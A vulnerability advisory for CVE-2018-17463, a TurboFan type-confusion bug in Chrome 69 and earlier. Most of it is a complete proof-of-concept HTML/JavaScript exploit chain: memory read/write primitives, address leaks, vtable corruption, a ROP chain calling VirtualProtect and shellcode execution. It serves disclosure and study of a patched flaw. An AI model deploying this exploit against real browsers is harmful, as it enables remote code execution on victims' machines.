**Vulnerability Summary**<br>
The following advisory discusses a vulnerability found in turbofan, the JIT compiler. We can trigger the JavaScript code in a way that leads to type confusion that can be exploited in order to execute code remotely on Google Chrome Versions 69.0 and before.

**Vendor Response**<br>
Vendor has fixed the issue in Google Chrome version 70.

**CVE**<br>
CVE-2018-17463

**Credit**<br>
Independent security researcher, Samuel Groß, had reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected Systems**<br>
Google Chrome Versions 69.0 and before.

**Vulnerability Details**<br>
In turbofan, the JIT compiler for v8, code is represented in a custom intermediate representation (IR) suitable for the various optimizations. To be able to detect and remove redundant checks, turbofan has to be able to model the side effects of all its IR operations. If this modelling is incorrect, safety checks, such as type checks, will incorrectly be removed from the emitted code, resulting in type confusions at runtime. See https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf for more information about this type of vulnerability. Turbofan assumes that the JSCreateObject operation, used for JavaScript code such as “let newObj = Object.create(proto)”, is completely side-effect free, as can be seen in the definition of the operation in js-operator.cc (the kNoWrite flag essentially means that the operation is sideeffect free):

`V(CreateObject, Operator::kNoWrite, 1, 1)`<br>
This assumption is, however, not correct: when creating a new object with the given prototype object, this prototype object is modified if this is the first time that the object is used as a prototype. In particular, if the object had fast storage of properties before (all properties in a linear array), it will be converted to dictionary mode (properties stored in a hash map). However, due to the incorrect side-effect modelling, following JIT code still assumes that the prototype object has fast property storage. This leads to a type confusion between a PropertyArray and a NameDictionary when accessing properties of the prototype.

**Exploit**<br>
The initial type confusion gained from the bug can be turned into a confusion between two properties of an object as both the PropertyArray and the NameDictionary store property values inline. As such, the code following the CreateObject operation might load a property X from the object but will actually load the value of property Y. This in turn can be used to construct additional type confusion primitives due to the fact that v8 traces the types of properties of an object. For example, v8 might know that some property will always contain a pointer to an object with a certain Map and will remove type checks based on that. When it then fetches a different property due to the bug, it might load a double value which it would then use as a pointer. The exploit constructs two type confusions to obtain arbitrary read/write of the process’ memory: The addrof function in the attached PoC exploit constructs a confusion between an unboxed double property and a JSObject pointer property, thus leaking the value of the pointer and defeating ASLR. The corrupt_arraybuffer function then constructs a confusion between an ArrayBuffer and an object with inline properties, allowing it to corrupt the pointer to the backing storage of the ArrayBuffer with an arbitrary address. This way the exploit obtains an arbitrary read/write primitive. Finally, a Blink object with a vtable is corrupted and a virtual call performed on it, leading to RIP control, the execution of a small ROP chain, and finally shellcode execution.

```html
<!DOCTYPE html>
<html>
    <head>
        <script>
        log = console.log;
        print = alert;
        // We need some space later
        let scratch = new ArrayBuffer(0x100000);
        let scratch_u8 = new Uint8Array(scratch);
        let scratch_u64 = new BigUint64Array(scratch);
        scratch_u8.fill(0x41, 0, 10);
        let shellcode = new Uint8Array(4);
        shellcode[0] = 0xcc;
        shellcode[1] = 0xbe;
        shellcode[2] = 0x20;
        shellcode[3] = 0x18;
        let ab = new ArrayBuffer(8);
        let floatView = new Float64Array(ab);
        let uint64View = new BigUint64Array(ab);
        let uint8View = new Uint8Array(ab);
        Number.prototype.toBigInt = function toBigInt() {
            floatView[0] = this;
            return uint64View[0];
        };
        BigInt.prototype.toNumber = function toNumber() {
            uint64View[0] = this;
            return floatView[0];
        };
        function hex(n) {
            return '0x' + n.toString(16);
        };
        function fail(s) {
            print('FAIL ' + s);
            throw null;
        }
        const NUM_PROPERTIES = 32;
        const MAX_ITERATIONS = 100000;
        function gc() {
            for (let i = 0; i < 200; i++) {
                new ArrayBuffer(0x100000);
            }
        }
        function make(properties) {
            let o = {inline: 42}      // TODO
            for (let i = 0; i < NUM_PROPERTIES; i++) {
                eval(`o.p${i} = properties[${i}];`);
            }
            return o;
        }
        function pwn() {
            function find_overlapping_properties() {
                let propertyNames = [];
                for (let i = 0; i < NUM_PROPERTIES; i++) {
                    propertyNames[i] = `p${i}`;
                }
                eval(`
                    function vuln(o) {
                        let a = o.inline;
                        this.Object.create(o);
                        ${propertyNames.map((p) => `let ${p} = o.${p};`).join('\n')}
                        return [${propertyNames.join(', ')}];
                    }
                `);
                let propertyValues = [];
                for (let i = 1; i < NUM_PROPERTIES; i++) {
                    propertyValues[i] = -i;
                }
                for (let i = 0; i < MAX_ITERATIONS; i++) {
                    let r = vuln(make(propertyValues));
                    if (r[1] !== -1) {
                        for (let i = 1; i < r.length; i++) {
                            if (i !== -r[i] && r[i] < 0 && r[i] > -NUM_PROPERTIES) {
                                return [i, -r[i]];
                            }
                        }
                    }
                }
                fail("Failed to find overlapping properties");
            }
            function addrof(obj) {
                eval(`
                    function vuln(o) {
                        let a = o.inline;
                        this.Object.create(o);
                        return o.p${p1}.x1;
                    }
                `);
                let propertyValues = [];
                propertyValues[p1] = {x1: 13.37, x2: 13.38};
                propertyValues[p2] = {y1: obj};
                let i = 0;
                for (; i < MAX_ITERATIONS; i++) {
                    let res = vuln(make(propertyValues));
                    if (res !== 13.37)
                        return res.toBigInt()
                }
                fail("Addrof failed");
            }
            function corrupt_arraybuffer(victim, newValue) {
                eval(`
                    function vuln(o) {
                        let a = o.inline;
                        this.Object.create(o);
                        let orig = o.p${p1}.x2;
                        o.p${p1}.x2 = ${newValue.toNumber()};
                        return orig;
                    }
                `);
                let propertyValues = [];
                let o = {x1: 13.37, x2: 13.38};
                propertyValues[p1] = o;
                propertyValues[p2] = victim;
                for (let i = 0; i < MAX_ITERATIONS; i++) {
                    o.x2 = 13.38;
                    let r = vuln(make(propertyValues));
                    if (r !== 13.38)
                        return r.toBigInt();
                }
                fail("Corrupt ArrayBuffer failed");
            }
            let [p1, p2] = find_overlapping_properties();
            log(`[+] Properties p${p1} and p${p2} overlap after conversion to dictionary mode`);
            let memview_buf = new ArrayBuffer(1024);
            let driver_buf = new ArrayBuffer(1024);
            gc();
            let memview_buf_addr = addrof(memview_buf);
            memview_buf_addr--;
            log(`[+] ArrayBuffer @ ${hex(memview_buf_addr)}`);
            let original_driver_buf_ptr = corrupt_arraybuffer(driver_buf, memview_buf_addr);
            let driver = new BigUint64Array(driver_buf);
            let original_memview_buf_ptr = driver[4];
            let memory = {
                write(addr, bytes) {
                    driver[4] = addr;
                    let memview = new Uint8Array(memview_buf);
                    memview.set(bytes);
                },
                read(addr, len) {
                    driver[4] = addr;
                    let memview = new Uint8Array(memview_buf);
                    return memview.subarray(0, len);
                },
                readPtr(addr) {
                    driver[4] = addr;
                    let memview = new BigUint64Array(memview_buf);
                    return memview[0];
                },
                writePtr(addr, ptr) {
                    driver[4] = addr;
                    let memview = new BigUint64Array(memview_buf);
                    memview[0] = ptr;
                },
                addrof(obj) {
                    memview_buf.leakMe = obj;
                    let props = this.readPtr(memview_buf_addr + 8n);
                    return this.readPtr(props + 15n) - 1n;
                },
            };
            let div = document.createElement('div');
            let div_addr = memory.addrof(div);
            //alert('div_addr = ' + hex(div_addr));
            let el_addr = memory.readPtr(div_addr + 0x20n);
            let leak = memory.readPtr(el_addr);
            let chrome_child = leak - 0x40b5f20n;
            //print('chrome_child @ ' + hex(chrome_child));
            // CreateEventW
            let kernel32 = memory.readPtr(chrome_child + 0x4771260n) - 0x20750n;
            //print('kernel32 @ ' + hex(kernel32));
            // NtQueryEvent
            let ntdll = memory.readPtr(kernel32 + 0x79208n) - 0x9a9a0n;
            //print('ntdll @ ' + hex(ntdll));
            /*
            00007ff9`296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]
            00007ff9`296f0709 488b6918        mov     rbp,qword ptr [rcx+18h]
            00007ff9`296f070d 488b6110        mov     rsp,qword ptr [rcx+10h]
            00007ff9`296f0711 ffe2            jmp     rdx
            */
            let gadget = ntdll + 0xA0705n;
            //let gadget = 0x41414141n;
            let pop_gadgets = [
                chrome_child + 0x36a657n, // pop rcx ; ret     59 c3
                chrome_child + 0x9962n, // pop rdx ; ret       5a c3
                chrome_child + 0xc72852n, // pop r8 ; ret      41 58 c3
                chrome_child + 0xc51425n, // pop r9 ; ret      41 59 c3
            ];
            let scratch_addr = memory.readPtr(memory.addrof(scratch) + 0x20n);
            let sc_offset = 0x20000n - scratch_addr % 0x1000n;
            let sc_addr = scratch_addr + sc_offset
            scratch_u8.set(shellcode, Number(sc_offset));
            scratch_u64.fill(gadget, 0, 100);
            //scratch_u64.fill(0xdeadbeefn, 0, 100);
            let fake_vtab = scratch_addr;
            let fake_stack = scratch_addr + 0x10000n;
            let stack = [
                pop_gadgets[0],
                sc_addr,
                pop_gadgets[1],
                0x1000n,
                pop_gadgets[2],
                0x40n,
                pop_gadgets[3],
                scratch_addr,
                kernel32 + 0x193d0n, // VirtualProtect
                sc_addr,
            ];
            for (let i = 0; i < stack.length; ++i) {
                scratch_u64[0x10000/8 + i] = stack[i];
            }
            memory.writePtr(el_addr + 0x10n, fake_stack); // RSP
            memory.writePtr(el_addr + 0x50n, pop_gadgets[0] + 1n); // RIP = ret
            memory.writePtr(el_addr + 0x58n, 0n);
            memory.writePtr(el_addr + 0x60n, 0n);
            memory.writePtr(el_addr + 0x68n, 0n);
            memory.writePtr(el_addr, fake_vtab);
            // Trigger virtual call
            div.dispatchEvent(new Event('click'));
            // We are done here, repair the corrupted array buffers
            let addr = memory.addrof(driver_buf);
            memory.writePtr(addr + 32n, original_driver_buf_ptr);
            memory.writePtr(memview_buf_addr + 32n, original_memview_buf_ptr);
        }
        alert("Press OK to pwn");
        pwn();
        </script>
    </head>
    <body>
    </body>
</html>
```
